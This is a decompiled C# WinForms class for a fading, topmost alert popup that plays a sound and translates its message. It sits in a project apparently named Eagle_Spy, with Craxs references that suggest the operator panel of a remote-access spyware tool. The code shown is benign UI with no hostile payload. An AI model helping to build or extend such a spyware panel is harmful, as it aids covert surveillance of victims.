using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Media;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using Eagle_Spy.My.Resources;
using DrakeUI.Framework;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy;

[DesignerGenerated]
public class alertform : Form

{
	[CompilerGenerated]
	private sealed class VB_0024StateMachine_39_FadeIn : IAsyncStateMachine
	{
		public int _0024State;

		public AsyncVoidMethodBuilder _0024Builder;
      

        internal Form _0024VB_0024Local_o;

		internal int _0024VB_0024Local_interval;

		internal alertform _0024VB_0024Me;

		internal Form _0024S0;

		internal Exception _0024VB_0024ResumableLocal_ex_00241;

		internal TaskAwaiter _0024A0;

		[CompilerGenerated]
		internal void MoveNext()
		{
			int num = _0024State;
			try
			{
				switch (num)
				{
				default:
					try
					{
						TaskAwaiter awaiter;
						if (num != -3)
						{
							if (num != 0)
								goto IL_0038;
							num = -1;
							_0024State = -1;
							awaiter = _0024A0;
							_0024A0 = default(TaskAwaiter);
							goto IL_006d;
						}
						num = -1;
						_0024State = -1;
						return;
						IL_006d:
						awaiter.GetResult();
						awaiter = default(TaskAwaiter);
						(_0024S0 = _0024VB_0024Local_o).Opacity = _0024S0.Opacity + 0.05;
						goto IL_0038;
						IL_0038:
						if (_0024VB_0024Local_o.Opacity < 1.0)
						{
							awaiter = Task.Delay(_0024VB_0024Local_interval).GetAwaiter();
							if (!awaiter.IsCompleted)
							{
								num = 0;
								_0024State = 0;
								_0024A0 = awaiter;
								ref AsyncVoidMethodBuilder reference = ref _0024Builder;
								VB_0024StateMachine_39_FadeIn stateMachine = this;
								reference.AwaitUnsafeOnCompleted(ref awaiter, ref stateMachine);
								return;
							}
							goto IL_006d;
						}
						_0024VB_0024Local_o.Opacity = 1.0;
						_0024VB_0024Me.Showtime = DateTime.Now.AddSeconds(5.0);
						_0024VB_0024Me.closetimer.Start();
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception ex2 = ex;
						_0024VB_0024ResumableLocal_ex_00241 = ex2;
						//////CraxsAlert.Showinformation("Sorry");
					}
					break;
				}
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception exception = ex3;
				_0024State = -2;
				_0024Builder.SetException(exception);
				//////CraxsAlert.Showinformation("Sorry");
				return;
			}
			num = -2;
			_0024State = -2;
			_0024Builder.SetResult();
		}

		void IAsyncStateMachine.MoveNext()
		{
			//ILSpy generated this explicit interface implementation from .override directive in MoveNext
			this.MoveNext();
		}

		[DebuggerNonUserCode]
		void IAsyncStateMachine.SetStateMachine(IAsyncStateMachine stateMachine)
		{
		}
	}

	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("pictureBox2")]
	private PictureBox _pictureBox2;

	private Label msglabel;

	private const uint SWP_SHOWWINDOW = 64u;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("closetimer")]
	private Timer _closetimer;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("lidlamb")]
	private DrakeUIButtonIcon _lidlamb;

	public string TheMessage;

	public int oldY;

	public Rectangle workingArea;

	public DateTime Showtime;

	private const int SW_SHOWNOACTIVATE = 4;

	public const int HWND_TOPMOST = -1;

	private const uint SWP_NOACTIVATE = 16u;

	private int counter;
    private SoundPlayer soundPlayer;
    private int hold;
    private PictureBox pictureBox1;
    private Guna.UI2.WinForms.Guna2GradientTileButton guna2GradientTileButton1;

    protected override bool ShowWithoutActivation => true;

	internal Timer closetimer
	;

	[DllImport("user32.dll", SetLastError = true)]
	private static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int x, int y, int cx, int cy, uint uFlags);

	protected override void OnLoad(EventArgs e)
	{
		base.OnLoad(e);
		SetWindowPos(base.Handle, new IntPtr(-1), base.Left, base.Top, base.Width, base.Height, 80u);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
			components.Dispose();
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
            this.components = new System.ComponentModel.Container();
            this.msglabel = new System.Windows.Forms.Label();
            this.closetimer = new System.Windows.Forms.Timer(this.components);
            this.guna2GradientTileButton1 = new Guna.UI2.WinForms.Guna2GradientTileButton();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            this.SuspendLayout();
            // 
            // msglabel
            // 
            this.msglabel.BackColor = System.Drawing.Color.Black;
            this.msglabel.Dock = System.Windows.Forms.DockStyle.Right;
            this.msglabel.Font = new System.Drawing.Font("Calibri", 11F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.msglabel.ForeColor = System.Drawing.Color.Red;
            this.msglabel.Location = new System.Drawing.Point(112, 0);
            this.msglabel.Name = "msglabel";
            this.msglabel.Size = new System.Drawing.Size(277, 48);
            this.msglabel.TabIndex = 2;
            this.msglabel.Text = "this is test msg";
            this.msglabel.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // closetimer
            // 
            this.closetimer.Interval = 40;
            this.closetimer.Tick += new System.EventHandler(this.Closetimer_Tick);
            // 
            // guna2GradientTileButton1
            // 
            this.guna2GradientTileButton1.BorderColor = System.Drawing.Color.Lime;
            this.guna2GradientTileButton1.BorderThickness = 2;
            this.guna2GradientTileButton1.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.guna2GradientTileButton1.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.guna2GradientTileButton1.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.guna2GradientTileButton1.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.guna2GradientTileButton1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.guna2GradientTileButton1.FillColor = System.Drawing.Color.Black;
            this.guna2GradientTileButton1.FillColor2 = System.Drawing.Color.Black;
            this.guna2GradientTileButton1.Font = new System.Drawing.Font("Bahnschrift", 11.25F);
            this.guna2GradientTileButton1.ForeColor = System.Drawing.Color.White;
            this.guna2GradientTileButton1.Location = new System.Drawing.Point(2, 0);
            this.guna2GradientTileButton1.Name = "guna2GradientTileButton1";
            this.guna2GradientTileButton1.Size = new System.Drawing.Size(387, 48);
            this.guna2GradientTileButton1.TabIndex = 5;
            this.guna2GradientTileButton1.Text = "OK";
            // 
            // pictureBox1
            // 
            this.pictureBox1.BackColor = System.Drawing.Color.Black;
            this.pictureBox1.Image = global::Eagle_Spy_Applications.remo;
            this.pictureBox1.Location = new System.Drawing.Point(11, 8);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(41, 31);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox1.TabIndex = 3;
            this.pictureBox1.TabStop = false;
            // 
            // alertform
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.Black;
            this.CausesValidation = false;
            this.ClientSize = new System.Drawing.Size(389, 48);
            this.ControlBox = false;
            this.Controls.Add(this.pictureBox1);
            this.Controls.Add(this.guna2GradientTileButton1);
            this.Controls.Add(this.msglabel);
            this.DoubleBuffered = true;
            this.ForeColor = System.Drawing.Color.Lime;
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Name = "alertform";
            this.Opacity = 0D;
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            this.Text = "AlertForm";
            this.TransparencyKey = System.Drawing.Color.Black;
            this.Load += new System.EventHandler(this.AlertForm_Load);
            this.Shown += new System.EventHandler(this.alertform_Shown);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            this.ResumeLayout(false);

	}

	[DllImport("user32.dll")]
	private static extern bool SetWindowPos(int hWnd, int hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

	[DllImport("user32.dll")]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	public static void ShowInactiveTopmost(Form frm)
	{
		ShowWindow(frm.Handle, 4);
		SetWindowPos(frm.Handle.ToInt32(), -1, frm.Left, frm.Top, frm.Width, frm.Height, 16u);
	}

	[AsyncStateMachine(typeof(VB_0024StateMachine_39_FadeIn))]
	[DebuggerStepThrough]
	private void FadeIn(Form o, int interval = 45)
	{
		VB_0024StateMachine_39_FadeIn stateMachine = new VB_0024StateMachine_39_FadeIn();
		stateMachine._0024VB_0024Me = this;
		stateMachine._0024VB_0024Local_o = o;
		stateMachine._0024VB_0024Local_interval = interval;
		stateMachine._0024State = -1;
		stateMachine._0024Builder = AsyncVoidMethodBuilder.Create();
		stateMachine._0024Builder.Start(ref stateMachine);
	}

	public alertform(string msg)
	{
		base.Load += AlertForm_Load;
		components = null;
		counter = 1;
		hold = 50;
		InitializeComponent();
		TheMessage = msg;
	}

	private void AlertForm_Load(object sender, EventArgs e)

	{
		guna2GradientTileButton1.Text = msglabel.Text;
            soundPlayer = new SoundPlayer();

        // Set the sound location to the .wav file in the "Sounds" folder next to the executable
        string soundFolderPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "res/Audio");
        string soundFilePath = Path.Combine(soundFolderPath, "alert.wav");

        soundPlayer.SoundLocation = soundFilePath;
        soundPlayer.Play();
        base.Opacity = 0.0;
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "AR", TextCompare: false) == 0)
				TheMessage = Codes.Translate(TheMessage, "en", "ar");
		}
		else
			TheMessage = Codes.Translate(TheMessage, "en", "zh");
		msglabel.Text = TheMessage;
		workingArea = Screen.GetWorkingArea(this);
		checked
		{
			oldY = workingArea.Bottom - base.Size.Height - 10;
			int num = 1;
			do
			{
				try
				{
					string name = "Craxs_Alert_" + Conversions.ToString(num);
					alertform alertform2 = (alertform)Application.OpenForms[name];
					if (alertform2 == null)
					{
						base.Name = name;
						break;
					}
					oldY = workingArea.Bottom - base.Size.Height - 10 - base.Height * num;
				}
				catch (Exception)
				{
					//ProjectData.SetProjectError(projectError);
					//////CraxsAlert.Showinformation("Sorry");
				}
				num++;
			}
			while (num <= 99);
			base.Location = new Point(workingArea.Right - base.Size.Width, oldY);
			ShowInactiveTopmost(this);
			FadeIn(this);
		}
	}

	private void Closetimer_Tick(object sender, EventArgs e)
	{
		checked
		{
			try
			{
				if (DateTime.Compare(Showtime, DateTime.Now) < 0)
				{
					base.Opacity = 0.0;
					closetimer.Stop();
					closetimer.Dispose();
					Close();
				}
				else if (hold == 0)
				{
					base.Name = "ended";
					workingArea = Screen.GetWorkingArea(this);
					base.Location = new Point(workingArea.Right - base.Size.Width, oldY - counter);
					counter++;
					base.Opacity -= 0.05;
				}
				else
				{
					hold--;
				}
			}
			catch (Exception)
			{
				//ProjectData.SetProjectError(projectError);
				//////CraxsAlert.Showinformation("Sorry");
			}
		}
	}

	private void PictureBox2_Click(object sender, EventArgs e)
	{
		closetimer.Stop();
		closetimer.Dispose();
		Close();
	}

	private void Lidlamb_MouseDown(object sender, MouseEventArgs e)
	{
		closetimer.Stop();
		closetimer.Dispose();
		Close();
	}

	private void Lidlamb_MouseUp(object sender, MouseEventArgs e)
	{
		closetimer.Start();
	}

    private void alertform_Shown(object sender, EventArgs e)
    {

    }
}
